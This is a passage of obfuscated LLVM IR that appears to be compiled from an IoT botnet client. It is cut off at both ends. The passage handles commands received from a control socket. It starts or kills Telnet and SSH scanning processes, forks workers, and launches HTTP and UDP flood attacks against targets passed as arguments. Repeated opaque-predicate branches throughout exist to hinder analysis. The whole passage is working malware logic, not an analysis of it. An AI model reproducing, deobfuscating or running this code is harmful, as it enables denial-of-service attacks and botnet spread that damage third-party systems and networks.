originalBBpart28:                                 ; preds = %originalBB6
  br i1 %103, label %249, label %112

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = load i32, i32* @scanPid, align 4
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %112
  br label %980

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i32 0, i32 0))
  %119 = load i32, i32* @scanPid, align 4
  %120 = call i32 @kill(i32 %119, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 1
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @strcmp(i8* %123, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i32 0, i32 0)) #10
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %192, label %126

; <label>:126:                                    ; preds = %116
  %127 = load i32, i32* @scanPid, align 4
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %130

; <label>:129:                                    ; preds = %126
  br label %980

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* @x.73
  %132 = load i32, i32* @y.74
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %130
  %139 = call i32 @fork() #2
  store i32 %139, i32* %5, align 4
  %140 = load i32, i32* @mainCommSock, align 4
  %141 = call i32 (i32, i8*, ...) @sockprintf(i32 %140, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %142 = load i32, i32* %5, align 4
  %143 = icmp ugt i32 %142, 0
  %144 = load i32, i32* @x.73
  %145 = load i32, i32* @y.74
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %143, label %152, label %154

; <label>:152:                                    ; preds = %originalBBpart212
  %153 = load i32, i32* %5, align 4
  store i32 %153, i32* @scanPid, align 4
  br label %980

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = load i32, i32* %5, align 4
  %156 = icmp eq i32 %155, -1
  br i1 %156, label %157, label %158

; <label>:157:                                    ; preds = %154
  br label %980

; <label>:158:                                    ; preds = %154
  %159 = load i32, i32* @x.73
  %160 = load i32, i32* @y.74
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %158
  %167 = load i32, i32* @x.73
  %168 = load i32, i32* @y.74
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %175

; <label>:175:                                    ; preds = %originalBBpart216
  %176 = load i32, i32* @x.73
  %177 = load i32, i32* @y.74
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %175
  call void (i32, ...) bitcast (void ()* @TelnetScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  %184 = load i32, i32* @x.73
  %185 = load i32, i32* @y.74
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  unreachable

; <label>:192:                                    ; preds = %116
  %193 = load i32, i32* @x.73
  %194 = load i32, i32* @y.74
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %192
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 1
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i32 0, i32 0)) #10
  %205 = icmp ne i32 %204, 0
  %206 = load i32, i32* @x.73
  %207 = load i32, i32* @y.74
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %205, label %248, label %214

; <label>:214:                                    ; preds = %originalBBpart224
  %215 = load i32, i32* @scanPid, align 4
  %216 = icmp ne i32 %215, 0
  br i1 %216, label %217, label %218

; <label>:217:                                    ; preds = %214
  br label %980

; <label>:218:                                    ; preds = %214
  %219 = load i32, i32* @x.73
  %220 = load i32, i32* @y.74
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %218
  %227 = call i32 @fork() #2
  store i32 %227, i32* %6, align 4
  %228 = load i32, i32* @mainCommSock, align 4
  %229 = call i32 (i32, i8*, ...) @sockprintf(i32 %228, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %230 = load i32, i32* %6, align 4
  %231 = icmp ugt i32 %230, 0
  %232 = load i32, i32* @x.73
  %233 = load i32, i32* @y.74
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %231, label %240, label %242

; <label>:240:                                    ; preds = %originalBBpart228
  %241 = load i32, i32* %6, align 4
  store i32 %241, i32* @scanPid, align 4
  br label %980

; <label>:242:                                    ; preds = %originalBBpart228
  %243 = load i32, i32* %6, align 4
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %245, label %246

; <label>:245:                                    ; preds = %242
  br label %980

; <label>:246:                                    ; preds = %242
  br label %247

; <label>:247:                                    ; preds = %246
  call void (i32, ...) bitcast (void ()* @secureShellScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:248:                                    ; preds = %originalBBpart224
  br label %249

; <label>:249:                                    ; preds = %248, %originalBBpart28
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 0
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @strcmp(i8* %252, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0)) #10
  %254 = icmp ne i32 %253, 0
  br i1 %254, label %351, label %255

; <label>:255:                                    ; preds = %249
  %256 = load i32, i32* %3, align 4
  %257 = icmp slt i32 %256, 3
  br i1 %257, label %264, label %258

; <label>:258:                                    ; preds = %255
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 2
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 @atoi(i8* %261) #10
  %263 = icmp slt i32 %262, 1
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %258, %255
  br label %980

; <label>:265:                                    ; preds = %258
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 1
  %268 = load i8*, i8** %267, align 8
  store i8* %268, i8** %7, align 8
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 2
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #10
  store i32 %272, i32* %8, align 4
  %273 = load i8*, i8** %7, align 8
  %274 = call i8* @strstr(i8* %273, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %275 = icmp ne i8* %274, null
  br i1 %275, label %276, label %309

; <label>:276:                                    ; preds = %265
  %277 = load i8*, i8** %7, align 8
  %278 = call i8* @strtok(i8* %277, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %278, i8** %9, align 8
  br label %279

; <label>:279:                                    ; preds = %306, %276
  %280 = load i8*, i8** %9, align 8
  %281 = icmp ne i8* %280, null
  br i1 %281, label %282, label %308

; <label>:282:                                    ; preds = %279
  %283 = load i32, i32* @x.73
  %284 = load i32, i32* @y.74
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %282
  %291 = call i32 @listFork()
  %292 = icmp ne i32 %291, 0
  %293 = load i32, i32* @x.73
  %294 = load i32, i32* @y.74
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %292, label %306, label %301

; <label>:301:                                    ; preds = %originalBBpart232
  %302 = load i8*, i8** %7, align 8
  %303 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %302, i32 %303)
  %304 = load i32, i32* @mainCommSock, align 4
  %305 = call i32 @close(i32 %304)
  call void @_exit(i32 0) #12
  unreachable

; <label>:306:                                    ; preds = %originalBBpart232
  %307 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %307, i8** %9, align 8
  br label %279

; <label>:308:                                    ; preds = %279
  br label %334

; <label>:309:                                    ; preds = %265
  %310 = call i32 @listFork()
  %311 = icmp ne i32 %310, 0
  br i1 %311, label %312, label %313

; <label>:312:                                    ; preds = %309
  br label %980

; <label>:313:                                    ; preds = %309
  %314 = load i32, i32* @x.73
  %315 = load i32, i32* @y.74
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %313
  %322 = load i8*, i8** %7, align 8
  %323 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %322, i32 %323)
  %324 = load i32, i32* @mainCommSock, align 4
  %325 = call i32 @close(i32 %324)
  call void @_exit(i32 0) #12
  %326 = load i32, i32* @x.73
  %327 = load i32, i32* @y.74
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  unreachable

; <label>:334:                                    ; preds = %308
  %335 = load i32, i32* @x.73
  %336 = load i32, i32* @y.74
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %334
  %343 = load i32, i32* @x.73
  %344 = load i32, i32* @y.74
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %351

; <label>:351:                                    ; preds = %originalBBpart240, %249
  %352 = load i32, i32* @x.73
  %353 = load i32, i32* @y.74
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %351
  %360 = load i8**, i8*** %4, align 8
  %361 = getelementptr inbounds i8*, i8** %360, i64 0
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @strcmp(i8* %362, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0)) #10
  %364 = icmp ne i32 %363, 0
  %365 = load i32, i32* @x.73
  %366 = load i32, i32* @y.74
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %364, label %634, label %373

; <label>:373:                                    ; preds = %originalBBpart244
  %374 = load i32, i32* %3, align 4
  %375 = icmp slt i32 %374, 6
  br i1 %375, label %469, label %376

; <label>:376:                                    ; preds = %373
  %377 = load i32, i32* @x.73
  %378 = load i32, i32* @y.74
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %376
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 3
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @atoi(i8* %387) #10
  %389 = icmp eq i32 %388, -1
  %390 = load i32, i32* @x.73
  %391 = load i32, i32* @y.74
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %389, label %469, label %398

; <label>:398:                                    ; preds = %originalBBpart248
  %399 = load i32, i32* @x.73
  %400 = load i32, i32* @y.74
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %398
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #10
  %411 = icmp eq i32 %410, -1
  %412 = load i32, i32* @x.73
  %413 = load i32, i32* @y.74
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %411, label %469, label %420

; <label>:420:                                    ; preds = %originalBBpart252
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 4
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #10
  %425 = icmp eq i32 %424, -1
  br i1 %425, label %469, label %426

; <label>:426:                                    ; preds = %420
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 5
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @atoi(i8* %429) #10
  %431 = icmp eq i32 %430, -1
  br i1 %431, label %469, label %432

; <label>:432:                                    ; preds = %426
  %433 = load i32, i32* @x.73
  %434 = load i32, i32* @y.74
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %432
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 5
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @atoi(i8* %443) #10
  %445 = icmp sgt i32 %444, 65500
  %446 = load i32, i32* @x.73
  %447 = load i32, i32* @y.74
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %445, label %469, label %454

; <label>:454:                                    ; preds = %originalBBpart256
  %455 = load i8**, i8*** %4, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 4
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @atoi(i8* %457) #10
  %459 = icmp sgt i32 %458, 32
  br i1 %459, label %469, label %460

; <label>:460:                                    ; preds = %454
  %461 = load i32, i32* %3, align 4
  %462 = icmp eq i32 %461, 7
  br i1 %462, label %463, label %486

; <label>:463:                                    ; preds = %460
  %464 = load i8**, i8*** %4, align 8
  %465 = getelementptr inbounds i8*, i8** %464, i64 6
  %466 = load i8*, i8** %465, align 8
  %467 = call i32 @atoi(i8* %466) #10
  %468 = icmp slt i32 %467, 1
  br i1 %468, label %469, label %486

; <label>:469:                                    ; preds = %463, %454, %originalBBpart256, %426, %420, %originalBBpart252, %originalBBpart248, %373
  %470 = load i32, i32* @x.73
  %471 = load i32, i32* @y.74
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %469
  %478 = load i32, i32* @x.73
  %479 = load i32, i32* @y.74
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %980

; <label>:486:                                    ; preds = %463, %460
  %487 = load i8**, i8*** %4, align 8
  %488 = getelementptr inbounds i8*, i8** %487, i64 1
  %489 = load i8*, i8** %488, align 8
  store i8* %489, i8** %10, align 8
  %490 = load i8**, i8*** %4, align 8
  %491 = getelementptr inbounds i8*, i8** %490, i64 2
  %492 = load i8*, i8** %491, align 8
  %493 = call i32 @atoi(i8* %492) #10
  store i32 %493, i32* %11, align 4
  %494 = load i8**, i8*** %4, align 8
  %495 = getelementptr inbounds i8*, i8** %494, i64 3
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @atoi(i8* %496) #10
  store i32 %497, i32* %12, align 4
  %498 = load i8**, i8*** %4, align 8
  %499 = getelementptr inbounds i8*, i8** %498, i64 4
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @atoi(i8* %500) #10
  store i32 %501, i32* %13, align 4
  %502 = load i8**, i8*** %4, align 8
  %503 = getelementptr inbounds i8*, i8** %502, i64 5
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @atoi(i8* %504) #10
  store i32 %505, i32* %14, align 4
  %506 = load i32, i32* %3, align 4
  %507 = icmp eq i32 %506, 7
  br i1 %507, label %508, label %513

; <label>:508:                                    ; preds = %486
  %509 = load i8**, i8*** %4, align 8
  %510 = getelementptr inbounds i8*, i8** %509, i64 6
  %511 = load i8*, i8** %510, align 8
  %512 = call i32 @atoi(i8* %511) #10
  br label %514

; <label>:513:                                    ; preds = %486
  br label %514

; <label>:514:                                    ; preds = %513, %508
  %515 = phi i32 [ %512, %508 ], [ 10, %513 ]
  store i32 %515, i32* %15, align 4
  %516 = load i8*, i8** %10, align 8
  %517 = call i8* @strstr(i8* %516, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %518 = icmp ne i8* %517, null
  br i1 %518, label %519, label %604

; <label>:519:                                    ; preds = %514
  %520 = load i32, i32* @x.73
  %521 = load i32, i32* @y.74
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %519
  %528 = load i8*, i8** %10, align 8
  %529 = call i8* @strtok(i8* %528, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %529, i8** %16, align 8
  %530 = load i32, i32* @x.73
  %531 = load i32, i32* @y.74
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %538

; <label>:538:                                    ; preds = %585, %originalBBpart264
  %539 = load i32, i32* @x.73
  %540 = load i32, i32* @y.74
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %538
  %547 = load i8*, i8** %16, align 8
  %548 = icmp ne i8* %547, null
  %549 = load i32, i32* @x.73
  %550 = load i32, i32* @y.74
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %548, label %557, label %587

; <label>:557:                                    ; preds = %originalBBpart268
  %558 = call i32 @listFork()
  %559 = icmp ne i32 %558, 0
  br i1 %559, label %585, label %560

; <label>:560:                                    ; preds = %557
  %561 = load i32, i32* @x.73
  %562 = load i32, i32* @y.74
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %560
  %569 = load i8*, i8** %16, align 8
  %570 = load i32, i32* %11, align 4
  %571 = load i32, i32* %12, align 4
  %572 = load i32, i32* %13, align 4
  %573 = load i32, i32* %14, align 4
  %574 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %569, i32 %570, i32 %571, i32 %572, i32 %573, i32 %574)
  %575 = load i32, i32* @mainCommSock, align 4
  %576 = call i32 @close(i32 %575)
  call void @_exit(i32 0) #12
  %577 = load i32, i32* @x.73
  %578 = load i32, i32* @y.74
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  unreachable

; <label>:585:                                    ; preds = %557
  %586 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %586, i8** %16, align 8
  br label %538

; <label>:587:                                    ; preds = %originalBBpart268
  %588 = load i32, i32* @x.73
  %589 = load i32, i32* @y.74
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %587
  %596 = load i32, i32* @x.73
  %597 = load i32, i32* @y.74
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %633

; <label>:604:                                    ; preds = %514
  %605 = call i32 @listFork()
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %624

; <label>:607:                                    ; preds = %604
  %608 = load i32, i32* @x.73
  %609 = load i32, i32* @y.74
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %607
  %616 = load i32, i32* @x.73
  %617 = load i32, i32* @y.74
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %980

; <label>:624:                                    ; preds = %604
  %625 = load i8*, i8** %10, align 8
  %626 = load i32, i32* %11, align 4
  %627 = load i32, i32* %12, align 4
  %628 = load i32, i32* %13, align 4
  %629 = load i32, i32* %14, align 4
  %630 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %625, i32 %626, i32 %627, i32 %628, i32 %629, i32 %630)
  %631 = load i32, i32* @mainCommSock, align 4
  %632 = call i32 @close(i32 %631)
  call void @_exit(i32 0) #12
  unreachable

; <label>:633:                                    ; preds = %originalBBpart276
  br label %634

; <label>:634:                                    ; preds = %633, %originalBBpart244
  %635 = load i8**, i8*** %4, align 8
  %636 = getelementptr inbounds i8*, i8** %635, i64 0
  %637 = load i8*, i8** %636, align 8
  %638 = call i32 @strcmp(i8* %637, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %639 = icmp ne i32 %638, 0
  br i1 %639, label %877, label %640

; <label>:640:                                    ; preds = %634
  %641 = load i32, i32* %3, align 4
  %642 = icmp slt i32 %641, 6
  br i1 %642, label %749, label %643

; <label>:643:                                    ; preds = %640
  %644 = load i8**, i8*** %4, align 8
  %645 = getelementptr inbounds i8*, i8** %644, i64 3
  %646 = load i8*, i8** %645, align 8
  %647 = call i32 @atoi(i8* %646) #10
  %648 = icmp eq i32 %647, -1
  br i1 %648, label %749, label %649

; <label>:649:                                    ; preds = %643
  %650 = load i8**, i8*** %4, align 8
  %651 = getelementptr inbounds i8*, i8** %650, i64 2
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @atoi(i8* %652) #10
  %654 = icmp eq i32 %653, -1
  br i1 %654, label %749, label %655

; <label>:655:                                    ; preds = %649
  %656 = load i32, i32* @x.73
  %657 = load i32, i32* @y.74
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %655
  %664 = load i8**, i8*** %4, align 8
  %665 = getelementptr inbounds i8*, i8** %664, i64 4
  %666 = load i8*, i8** %665, align 8
  %667 = call i32 @atoi(i8* %666) #10
  %668 = icmp eq i32 %667, -1
  %669 = load i32, i32* @x.73
  %670 = load i32, i32* @y.74
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %668, label %749, label %677

; <label>:677:                                    ; preds = %originalBBpart284
  %678 = load i8**, i8*** %4, align 8
  %679 = getelementptr inbounds i8*, i8** %678, i64 4
